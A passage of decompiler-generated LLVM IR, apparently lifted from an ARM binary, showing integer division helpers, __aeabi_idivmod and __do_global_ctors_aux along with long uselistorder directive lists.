  %v0_1a78c.pr = phi i32 [ %v0_1a78c.pr42, %dec_label_pc_1a78cthread-pre-split.loopexit ], [ %v3_1a794, %bb91 ]
  br label %dec_label_pc_1a78c

dec_label_pc_1a78c.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_1a78c

dec_label_pc_1a78c:                               ; preds = %dec_label_pc_1a78c.loopexit, %dec_label_pc_1a78cthread-pre-split
  %v1_1a798 = phi i32 [ %v1_1a79850, %dec_label_pc_1a78cthread-pre-split ], [ %v1_1a784, %dec_label_pc_1a78c.loopexit ]
  %v2_1a790 = phi i32 [ %v2_1a79048, %dec_label_pc_1a78cthread-pre-split ], [ %v0_1a844, %dec_label_pc_1a78c.loopexit ]
  %v1_1a794 = phi i32 [ %v0_1a78c.pr, %dec_label_pc_1a78cthread-pre-split ], [ %v4_1a780, %dec_label_pc_1a78c.loopexit ]
  %v2_1a78c = icmp slt i32 %v1_1a794, 0
  br i1 %v2_1a78c, label %dec_label_pc_1a7a0, label %bb90

bb90:                                             ; preds = %dec_label_pc_1a78c
  %v4_1a790 = icmp ult i32 %v1_1a794, %v2_1a790
  br i1 %v4_1a790, label %bb91, label %dec_label_pc_1a7a0

bb91:                                             ; preds = %bb90
  %v3_1a794 = mul i32 %v1_1a794, 2
  %v2_1a798 = icmp slt i32 %v1_1a798, 0
  %v3_1a798 = mul i32 %v1_1a798, 2
  br i1 %v2_1a798, label %dec_label_pc_1a7a0, label %dec_label_pc_1a78cthread-pre-split

dec_label_pc_1a7a0:                               ; preds = %bb90, %dec_label_pc_1a78c, %bb91
  %v2_1a7ac63 = phi i32 [ %v3_1a798, %bb91 ], [ %v1_1a798, %bb90 ], [ %v1_1a798, %dec_label_pc_1a78c ]
  %v1_1a7a455 = phi i32 [ %v3_1a794, %bb91 ], [ %v1_1a794, %bb90 ], [ %v1_1a794, %dec_label_pc_1a78c ]
  br label %dec_label_pc_1a7a4

dec_label_pc_1a7a4:                               ; preds = %.thread13, %dec_label_pc_1a7a0
  %v1_1a7d8 = phi i32 [ %v4_1a7d8, %.thread13 ], [ %v2_1a7ac63, %dec_label_pc_1a7a0 ]
  %v1_1a7ac = phi i32 [ %v1_1a7e8, %.thread13 ], [ 0, %dec_label_pc_1a7a0 ]
  %v1_1a7dc = phi i32 [ %v4_1a7dc, %.thread13 ], [ %v1_1a7a455, %dec_label_pc_1a7a0 ]
  %v1_1a7a8 = phi i32 [ %v0_1a7d4, %.thread13 ], [ %v0_1a844, %dec_label_pc_1a7a0 ]
  %v3_1a7a4 = icmp ult i32 %v1_1a7a8, %v1_1a7dc
  br i1 %v3_1a7a4, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_1a7a4
  %v3_1a7a8 = sub i32 %v1_1a7a8, %v1_1a7dc
  %v3_1a7ac = or i32 %v1_1a7ac, %v1_1a7d8
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1a7a4, %bb92
  %v1_1a7b4 = phi i32 [ %v1_1a7a8, %dec_label_pc_1a7a4 ], [ %v3_1a7a8, %bb92 ]
  %v1_1a7b8 = phi i32 [ %v1_1a7ac, %dec_label_pc_1a7a4 ], [ %v3_1a7ac, %bb92 ]
  %v4_1a7b0 = udiv i32 %v1_1a7dc, 2
  %v6_1a7b0 = icmp ult i32 %v1_1a7b4, %v4_1a7b0
  br i1 %v6_1a7b0, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_1a7b4 = urem i32 %v1_1a7dc, 2
  %v4_1a7b4 = icmp eq i32 %v3_1a7b4, 0
  %v6_1a7b4 = sub i32 %v1_1a7b4, %v4_1a7b0
  br i1 %v4_1a7b4, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_1a7b8 = udiv i32 %v1_1a7d8, 2
  %v6_1a7b8 = or i32 %v1_1a7b8, %v5_1a7b8
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_1a7c0 = phi i32 [ %v6_1a7b4, %bb93 ], [ %v1_1a7b4, %.thread8 ], [ %v6_1a7b4, %bb94 ]
  %v1_1a7c4 = phi i32 [ %v1_1a7b8, %bb93 ], [ %v1_1a7b8, %.thread8 ], [ %v6_1a7b8, %bb94 ]
  %v4_1a7bc = udiv i32 %v1_1a7dc, 4
  %v6_1a7bc = icmp ult i32 %v1_1a7c0, %v4_1a7bc
  br i1 %v6_1a7bc, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_1a7c0 = and i32 %v1_1a7dc, 2
  %v4_1a7c0 = icmp eq i32 %v3_1a7c0, 0
  %v6_1a7c0 = sub i32 %v1_1a7c0, %v4_1a7bc
  br i1 %v4_1a7c0, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_1a7c4 = udiv i32 %v1_1a7d8, 4
  %v6_1a7c4 = or i32 %v1_1a7c4, %v5_1a7c4
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_1a7cc = phi i32 [ %v6_1a7c0, %bb95 ], [ %v1_1a7c0, %.thread9 ], [ %v6_1a7c0, %bb96 ]
  %v1_1a7d0 = phi i32 [ %v1_1a7c4, %bb95 ], [ %v1_1a7c4, %.thread9 ], [ %v6_1a7c4, %bb96 ]
  %v4_1a7c8 = udiv i32 %v1_1a7dc, 8
  %v6_1a7c8 = icmp ult i32 %v1_1a7cc, %v4_1a7c8
  br i1 %v6_1a7c8, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_1a7cc = and i32 %v1_1a7dc, 4
  %v4_1a7cc = icmp eq i32 %v3_1a7cc, 0
  %v6_1a7cc = sub i32 %v1_1a7cc, %v4_1a7c8
  br i1 %v4_1a7cc, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_1a7d0 = udiv i32 %v1_1a7d8, 8
  %v6_1a7d0 = or i32 %v1_1a7d0, %v5_1a7d0
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_1a7e8 = phi i32 [ %v1_1a7d0, %bb97 ], [ %v1_1a7d0, %.thread10 ], [ %v6_1a7d0, %bb98 ]
  %v0_1a7d4 = phi i32 [ %v6_1a7cc, %bb97 ], [ %v1_1a7cc, %.thread10 ], [ %v6_1a7cc, %bb98 ]
  %v2_1a7d4 = icmp eq i32 %v0_1a7d4, 0
  br i1 %v2_1a7d4, label %dec_label_pc_1a7e4, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_1a7d8, 16
  br i1 %tmp, label %dec_label_pc_1a7e4, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_1a7d8 = udiv i32 %v1_1a7d8, 16
  %v4_1a7dc = udiv i32 %v1_1a7dc, 16
  br label %dec_label_pc_1a7a4

dec_label_pc_1a7e4:                               ; preds = %thread-pre-split12, %bb99
  %v1_1a7e4 = icmp slt i32 %v2_1a73c, 0
  br i1 %v1_1a7e4, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_1a7e4
  %v2_1a7e8 = sub i32 0, %v1_1a7e8
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_1a7f0, %dec_label_pc_1a7e4, %bb100
  %v1_1a7ec = phi i32 [ %v1_1a7e8, %dec_label_pc_1a7e4 ], [ %v2_1a7e8, %bb100 ], [ %v0_1a73c, %dec_label_pc_1a7f0 ], [ %v2_1a7f4, %bb101 ], [ %v1_1a80880, %bb103 ], [ %v2_1a804, %bb104 ]
  ret i32 %v1_1a7ec

dec_label_pc_1a7f0:                               ; preds = %thread-pre-split
  br i1 %v1_1a738, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_1a7f0
  %v2_1a7f4 = sub i32 0, %v0_1a73c
  br label %.thread16

dec_label_pc_1a7fc:                               ; preds = %bb86
  br i1 %v3_1a758, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_1a7fc
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_1a7fc, %bb102
  %v1_1a80880 = phi i32 [ %v0_1a73c, %dec_label_pc_1a7fc ], [ 0, %bb102 ]
  br i1 %v9_1a758, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_1a800 = ashr i32 %v2_1a73c, 31
  %v2_1a804 = or i32 %v4_1a800, 1
  br label %.thread16

dec_label_pc_1a80c:                               ; preds = %dec_label_pc_1a760
  %v2_1a80c = icmp ugt i32 %v1_1a810, 65535
  br i1 %v2_1a80c, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_1a80c
  %v2_1a810 = and i32 %v1_1a810, 32768
  %v3_1a810 = icmp eq i32 %v2_1a810, 0
  %v4_1a810 = udiv i32 %v1_1a810, 65536
  br i1 %v3_1a810, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_1a80c
  %v0_1a81c70 = phi i32 [ %v1_1a810, %dec_label_pc_1a80c ], [ %v4_1a810, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_1a820 = phi i32 [ %v0_1a81c70, %.thread19 ], [ %v4_1a810, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_1a81c = icmp ugt i32 %v1_1a820, 255
  br i1 %v2_1a81c, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_1a820 = and i32 %v1_1a820, 128
  %v3_1a820 = icmp eq i32 %v2_1a820, 0
  %v4_1a820 = udiv i32 %v1_1a820, 256
  br i1 %v3_1a820, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_1a824 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_1a830 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_1a824, %bb108 ]
  %v1_1a82c = phi i32 [ %v1_1a820, %bb106 ], [ %v4_1a820, %bb107 ], [ %v4_1a820, %bb108 ]
  %v2_1a828 = icmp ugt i32 %v1_1a82c, 15
  br i1 %v2_1a828, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_1a82c = and i32 %v1_1a82c, 8
  %v3_1a82c = icmp eq i32 %v2_1a82c, 0
  %v4_1a82c = udiv i32 %v1_1a82c, 16
  br i1 %v3_1a82c, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_1a830 = add nsw i32 %v1_1a830, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_1a838 = phi i32 [ %v1_1a830, %.thread20 ], [ %v1_1a830, %bb109 ], [ %v2_1a830, %bb110 ]
  %v5_1a83c = phi i32 [ %v1_1a82c, %.thread20 ], [ %v4_1a82c, %bb109 ], [ %v4_1a82c, %bb110 ]
  %v2_1a834 = icmp ugt i32 %v5_1a83c, 3
  %v7_1a834 = icmp eq i32 %v5_1a83c, 4
  %v2_1a838 = xor i1 %v7_1a834, true
  %v3_1a838 = and i1 %v2_1a834, %v2_1a838
  br i1 %v3_1a838, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_1a838 = add nsw i32 %v4_1a838, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_1a83c = phi i32 [ %v4_1a838, %.thread21 ], [ %v5_1a838, %bb111 ]
  %v2_1a83c = xor i1 %v2_1a834, true
  %v3_1a83c = or i1 %v7_1a834, %v2_1a83c
  br i1 %v3_1a83c, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_1a83c = udiv i32 %v5_1a83c, 2
  %v9_1a83c = add i32 %v4_1a83c, %v8_1a83c
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_1a844 = phi i32 [ %v4_1a83c, %bb112 ], [ %v9_1a83c, %bb113 ]
  %v1_1a840 = icmp slt i32 %v2_1a73c, 0
  %v6_1a844 = lshr i32 %v0_1a844, %v1_1a844
  %v2_1a848 = sub i32 0, %v6_1a844
  %v2_1a848.v6_1a844 = select i1 %v1_1a840, i32 %v2_1a848, i32 %v6_1a844
  ret i32 %v2_1a848.v6_1a844

dec_label_pc_1a850:                               ; preds = %entry
  %v0_1a850 = load i32, i32* @lr, align 4
  %v0_1a854 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_1a850)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1a83c, { 1, 0 }
  uselistorder i1 %v7_1a834, { 1, 0 }
  uselistorder i32 %v4_1a82c, { 1, 0 }
  uselistorder i32 %v1_1a82c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1a820, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_1a820, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1a810, { 1, 0 }
  uselistorder i32 %v0_1a7d4, { 1, 0 }
  uselistorder i32 %v4_1a7c8, { 1, 0 }
  uselistorder i32 %v1_1a7d0, { 1, 2, 0 }
  uselistorder i32 %v4_1a7bc, { 1, 0 }
  uselistorder i32 %v1_1a7c4, { 1, 2, 0 }
  uselistorder i32 %v4_1a7b0, { 1, 0 }
  uselistorder i32 %v1_1a7b8, { 1, 2, 0 }
  uselistorder i32 %v1_1a7dc, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1a7ac, { 1, 0 }
  uselistorder i32 %v1_1a7d8, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1a798, { 1, 0 }
  uselistorder i32 %v3_1a794, { 1, 0 }
  uselistorder i32 %v1_1a794, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_1a790, { 1, 0 }
  uselistorder i32 %v1_1a798, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1a784, { 1, 0 }
  uselistorder i32 %v4_1a780, { 2, 1, 0 }
  uselistorder i32 %v1_1a784, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1a78c.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_1a758, { 1, 0 }
  uselistorder i32 %v1_1a810, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_1a73c, { 1, 0, 2 }
  uselistorder i32 %v0_1a73c, { 3, 2, 1, 4, 5, 6, 0 }
  uselistorder i32 ()* @__aeabi_ldiv0, { 3, 2, 1, 0 }
  uselistorder i32* @lr, { 46, 48, 49, 50, 53, 54, 55, 3, 56, 57, 58, 59, 60, 43, 44, 45, 17, 18, 19, 20, 61, 68, 69, 70, 71, 72, 73, 74, 83, 22, 21, 0, 23, 24, 1, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 4, 102, 103, 104, 5, 105, 106, 107, 6, 108, 109, 110, 111, 112, 113, 114, 115, 64, 25, 26, 27, 7, 29, 30, 28, 84, 85, 86, 116, 47, 78, 117, 118, 119, 12, 13, 14, 15, 87, 88, 89, 120, 51, 52, 80, 81, 31, 32, 75, 76, 77, 82, 62, 16, 65, 66, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 2, 63, 10, 11, 67, 79, 90, 91, 8, 9 }
  uselistorder i32 3, { 79, 50, 26, 27, 81, 21, 82, 83, 22, 84, 85, 13, 66, 0, 29, 28, 51, 3, 2, 1, 4, 86, 30, 5, 6, 14, 7, 8, 52, 53, 94, 54, 55, 56, 57, 58, 59, 67, 11, 31, 68, 32, 70, 33, 71, 34, 72, 35, 73, 36, 74, 12, 64, 95, 17, 65, 91, 92, 23, 90, 15, 87, 16, 69, 9, 10, 60, 24, 61, 25, 93, 62, 37, 19, 38, 75, 76, 20, 77, 39, 78, 63, 42, 41, 40, 49, 80, 43, 88, 89, 44, 45, 46, 47, 48, 18 }
  uselistorder i32 15, { 2, 1, 5, 3, 8, 0, 4, 6, 7 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 147, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 144, 63, 145, 64, 146, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 140, 1, 77, 78, 81, 80, 79, 84, 83, 82, 85, 86, 87, 88, 89, 90, 148, 91, 92, 93, 139, 98, 94, 95, 99, 96, 97, 100, 105, 101, 102, 104, 103, 106, 108, 107, 141, 109, 142, 111, 110, 112, 113, 114, 117, 115, 116, 118, 119, 120, 122, 121, 123, 124, 125, 128, 126, 127, 129, 130, 132, 131, 133, 134, 135, 136, 137, 138, 143 }
  uselistorder i32 128, { 11, 6, 7, 9, 5, 18, 0, 21, 22, 1, 20, 8, 14, 15, 2, 3, 10, 16, 17, 4, 13, 12, 19 }
  uselistorder i32 255, { 6, 9, 1, 8, 0, 7, 2, 3, 4, 5 }
  uselistorder i32 65536, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 13, 9, 14, 10, 15, 11, 16, 12, 17, 18, 19, 23, 20, 24, 21, 25, 22, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 76, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 69, 70, 68, 71, 73, 74, 72, 75, 77 }
  uselistorder i32 32768, { 2, 1, 0, 4, 3 }
  uselistorder i32 65535, { 2, 1, 3, 0 }
  uselistorder i32 31, { 15, 10, 4, 12, 2, 1, 0, 5, 7, 6, 8, 3, 13, 14, 11, 9, 16 }
  uselistorder i32 4, {}
  uselistorder i32 2, { 2, 124, 3, 4, 5, 6, 7, 45, 8, 158, 68, 69, 160, 115, 116, 159, 70, 161, 162, 163, 164, 165, 44, 85, 130, 9, 132, 131, 166, 167, 168, 10, 46, 47, 48, 49, 50, 51, 134, 135, 117, 118, 119, 11, 120, 52, 186, 187, 74, 188, 189, 55, 190, 54, 191, 53, 171, 136, 43, 137, 138, 12, 139, 140, 86, 87, 147, 88, 148, 89, 149, 13, 56, 14, 121, 90, 150, 91, 151, 92, 152, 93, 153, 94, 154, 71, 133, 42, 15, 192, 72, 173, 16, 95, 174, 175, 17, 96, 176, 177, 82, 125, 0, 18, 19, 20, 97, 57, 59, 58, 60, 61, 62, 63, 76, 64, 77, 65, 66, 169, 170, 141, 142, 83, 21, 22, 23, 122, 24, 84, 143, 78, 75, 25, 144, 145, 146, 172, 26, 123, 1, 27, 28, 29, 30, 31, 32, 33, 34, 35, 126, 36, 37, 38, 39, 40, 98, 73, 99, 79, 155, 156, 100, 80, 101, 105, 127, 104, 128, 103, 102, 129, 114, 106, 157, 107, 108, 178, 179, 180, 181, 109, 182, 110, 111, 112, 185, 81, 183, 41, 184, 67, 113 }
  uselistorder i32 16, { 3, 22, 4, 5, 1, 6, 7, 87, 88, 89, 0, 90, 91, 8, 9, 92, 93, 10, 94, 95, 96, 97, 62, 63, 107, 108, 30, 31, 32, 115, 33, 116, 117, 34, 118, 119, 35, 120, 121, 122, 123, 124, 125, 98, 102, 103, 64, 65, 36, 66, 67, 68, 69, 70, 71, 72, 73, 99, 37, 74, 27, 57, 38, 54, 85, 55, 109, 110, 126, 25, 104, 105, 75, 76, 77, 78, 79, 80, 50, 100, 101, 56, 106, 24, 11, 12, 13, 14, 15, 16, 23, 17, 18, 2, 19, 20, 28, 40, 41, 58, 59, 60, 61, 42, 81, 82, 43, 39, 44, 83, 84, 51, 52, 45, 53, 86, 26, 29, 46, 111, 112, 113, 47, 114, 21, 48, 49 }
  uselistorder i32 268435455, { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 8, { 51, 24, 3, 4, 14, 5, 108, 109, 110, 111, 0, 1, 112, 113, 114, 115, 116, 6, 117, 58, 44, 45, 52, 118, 119, 120, 121, 20, 122, 72, 141, 152, 36, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 37, 123, 73, 74, 75, 76, 77, 78, 79, 80, 81, 22, 82, 53, 83, 84, 85, 124, 125, 126, 169, 25, 59, 7, 107, 138, 60, 61, 35, 145, 144, 142, 143, 63, 64, 65, 146, 147, 148, 149, 150, 151, 8, 135, 136, 2, 168, 40, 41, 38, 39, 16, 17, 28, 29, 42, 170, 86, 127, 128, 87, 88, 54, 89, 90, 91, 92, 21, 93, 48, 49, 94, 95, 96, 43, 97, 98, 99, 100, 27, 18, 19, 101, 102, 50, 129, 130, 62, 131, 132, 23, 133, 134, 9, 10, 55, 26, 11, 12, 15, 13, 66, 67, 68, 69, 70, 46, 71, 103, 104, 47, 105, 106, 34, 33, 32, 56, 57, 31, 30, 137, 139, 140 }
  uselistorder i32 536870912, { 0, 2, 1 }
  uselistorder i1 true, { 0, 1, 2, 45, 48, 3, 4, 6, 5, 7, 51, 49, 8, 9, 10, 11, 12, 13, 50, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 28, 29, 26, 27, 30, 31, 44, 52, 32, 33, 34, 46, 35, 36, 37, 38, 47, 39, 40, 41, 42, 43 }
  uselistorder i32 %arg2, { 2, 3, 4, 0, 1 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_1a7e4, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1a7a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a78cthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1a864 = sdiv i32 %arg1, %arg2
  ret i32 %v2_1a864
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1a87c = load i32, i32* @global_var_26000.1049, align 4
  %v7_1a880 = icmp eq i32 %v3_1a87c, -1
  %v3_1a884 = load i32, i32* @r4, align 4
  store i32 %v3_1a884, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_26000.1049 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_1a880, label %bb, label %.preheader

bb:                                               ; preds = %entry
  store i32 %v3_1a884, i32* %r4.global-to-local, align 4
  %v9_1a88c = load i32, i32* @r0, align 4
  ret i32 %v9_1a88c

.preheader:                                       ; preds = %entry, %.preheader
  %v0_1a894 = phi i32 [ %v3_1a898, %.preheader ], [ %v3_1a87c, %entry ]
  call void @__pseudo_branch(i32 %v0_1a894)
  %v0_1a898 = load i32, i32* %r4.global-to-local, align 4
  %v1_1a898 = add i32 %v0_1a898, -4
  %v2_1a898 = inttoptr i32 %v1_1a898 to i32*
  %v3_1a898 = load i32, i32* %v2_1a898, align 4
  store i32 %v1_1a898, i32* %r4.global-to-local, align 4
  %v3_1a89c = icmp eq i32 %v3_1a898, -1
  br i1 %v3_1a89c, label %dec_label_pc_1a8a4, label %.preheader

dec_label_pc_1a8a4:                               ; preds = %.preheader
  %v2_1a8a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1a8a4, i32* %r4.global-to-local, align 4
  %v8_1a8a4 = load i32, i32* @r0, align 4
  ret i32 %v8_1a8a4

; uselistorder directives
  uselistorder i32 %v3_1a898, { 1, 0 }
  uselistorder i32 %v3_1a87c, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -4, { 67, 18, 19, 59, 20, 28, 68, 69, 70, 12, 29, 30, 31, 71, 72, 73, 13, 32, 33, 34, 74, 75, 76, 14, 35, 36, 77, 27, 26, 78, 79, 80, 25, 24, 23, 22, 37, 38, 39, 40, 41, 9, 42, 10, 43, 11, 81, 21, 44, 16, 60, 0, 51, 52, 53, 54, 64, 55, 45, 46, 56, 57, 58, 65, 66, 47, 17, 15, 61, 62, 63, 48, 49, 1, 50, 3, 4, 5, 6, 7, 8, 2 }
  uselistorder i32 -1, { 184, 0, 185, 1, 58, 59, 2, 304, 186, 269, 82, 305, 157, 3, 306, 83, 4, 5, 84, 259, 6, 7, 8, 90, 88, 85, 260, 138, 139, 89, 87, 86, 161, 261, 307, 187, 188, 78, 45, 9, 91, 270, 189, 190, 271, 272, 92, 308, 93, 191, 65, 94, 11, 12, 163, 60, 61, 162, 314, 67, 66, 62, 63, 192, 141, 142, 193, 194, 10, 315, 273, 195, 79, 46, 196, 274, 13, 47, 197, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 198, 310, 312, 199, 71, 275, 201, 276, 277, 80, 72, 73, 278, 279, 280, 281, 282, 74, 164, 283, 147, 200, 165, 284, 323, 324, 202, 166, 167, 14, 285, 203, 204, 286, 287, 168, 95, 328, 96, 334, 97, 301, 98, 354, 99, 355, 100, 356, 101, 357, 102, 329, 103, 358, 15, 16, 205, 17, 104, 296, 297, 206, 207, 208, 268, 169, 170, 105, 18, 298, 19, 262, 70, 209, 20, 263, 210, 171, 211, 21, 22, 69, 48, 49, 212, 213, 214, 64, 299, 215, 300, 23, 24, 106, 316, 107, 317, 108, 302, 109, 335, 110, 325, 111, 321, 112, 267, 113, 322, 172, 318, 114, 319, 216, 115, 217, 288, 218, 219, 220, 116, 221, 222, 223, 224, 225, 226, 50, 51, 81, 227, 156, 117, 228, 25, 68, 75, 76, 311, 229, 289, 230, 173, 290, 52, 291, 292, 174, 26, 231, 232, 143, 148, 146, 27, 149, 30, 28, 29, 150, 175, 293, 294, 233, 31, 53, 54, 295, 313, 118, 309, 119, 336, 120, 303, 121, 359, 360, 122, 264, 123, 326, 124, 327, 125, 265, 126, 330, 127, 361, 128, 337, 129, 364, 130, 331, 131, 338, 132, 320, 133, 332, 134, 333, 135, 266, 136, 362, 77, 363, 55, 56, 234, 235, 236, 237, 238, 239, 144, 137, 176, 240, 241, 242, 243, 36, 37, 38, 32, 33, 34, 35, 177, 178, 244, 245, 246, 39, 247, 248, 57, 40, 41, 140, 179, 180, 42, 145, 249, 250, 158, 159, 160, 43, 251, 151, 152, 153, 154, 155, 44, 252, 253, 254, 255, 256, 257, 258, 181, 182, 183 }
  uselistorder i32* @global_var_26000.1049, { 1, 0 }
  uselistorder i32 1, { 536, 152, 984, 362, 985, 991, 992, 993, 994, 995, 996, 997, 537, 290, 291, 289, 286, 285, 287, 288, 998, 459, 999, 1000, 538, 110, 109, 111, 108, 114, 112, 113, 1001, 259, 1002, 402, 1003, 1008, 1009, 438, 1010, 1011, 1012, 460, 461, 1013, 1014, 539, 292, 293, 297, 294, 296, 295, 540, 1015, 541, 262, 261, 260, 263, 1016, 542, 202, 203, 1017, 1018, 1019, 1020, 543, 50, 51, 851, 852, 853, 854, 855, 856, 857, 858, 859, 546, 545, 544, 157, 158, 159, 860, 861, 862, 863, 864, 550, 549, 548, 547, 241, 240, 246, 242, 245, 244, 243, 247, 248, 239, 249, 403, 1021, 1022, 404, 1023, 1024, 1025, 1026, 1027, 462, 1028, 1029, 1030, 1031, 1032, 552, 551, 207, 205, 209, 206, 210, 211, 212, 204, 208, 379, 1037, 1033, 1034, 1035, 1036, 424, 553, 117, 118, 116, 1038, 554, 962, 963, 964, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 555, 200, 201, 194, 195, 196, 197, 199, 198, 387, 44, 1054, 1055, 1056, 1057, 1058, 1059, 556, 299, 300, 301, 298, 557, 160, 388, 463, 892, 558, 48, 46, 45, 49, 47, 1060, 1061, 464, 559, 186, 187, 184, 188, 183, 185, 893, 894, 561, 560, 303, 305, 304, 302, 306, 562, 182, 1068, 405, 1067, 389, 367, 1070, 406, 1069, 0, 1073, 1074, 1075, 1076, 565, 564, 563, 163, 164, 1116, 1117, 1118, 1119, 1120, 439, 1121, 1122, 440, 1124, 465, 1125, 432, 433, 443, 1, 441, 442, 1126, 1123, 466, 1127, 428, 572, 571, 523, 570, 569, 524, 568, 567, 566, 380, 427, 1196, 1197, 1198, 1199, 1200, 407, 573, 238, 965, 966, 967, 574, 309, 310, 308, 307, 895, 390, 896, 1239, 391, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 1248, 1249, 1250, 1251, 525, 576, 575, 123, 124, 125, 126, 121, 120, 119, 122, 128, 127, 467, 1077, 1078, 1093, 1094, 1095, 1096, 577, 526, 80, 79, 81, 392, 408, 897, 468, 898, 899, 469, 376, 409, 373, 434, 435, 900, 470, 901, 902, 903, 904, 410, 905, 363, 906, 907, 471, 908, 909, 590, 589, 588, 587, 586, 585, 584, 583, 582, 581, 580, 579, 578, 527, 147, 141, 144, 146, 140, 138, 139, 151, 143, 142, 137, 135, 136, 145, 150, 148, 149, 1172, 1173, 528, 591, 54, 52, 57, 59, 55, 56, 53, 58, 910, 911, 912, 913, 374, 914, 915, 916, 592, 266, 267, 264, 268, 265, 917, 918, 593, 156, 1079, 1080, 1081, 1082, 1083, 176, 175, 172, 174, 171, 170, 177, 173, 919, 595, 594, 180, 178, 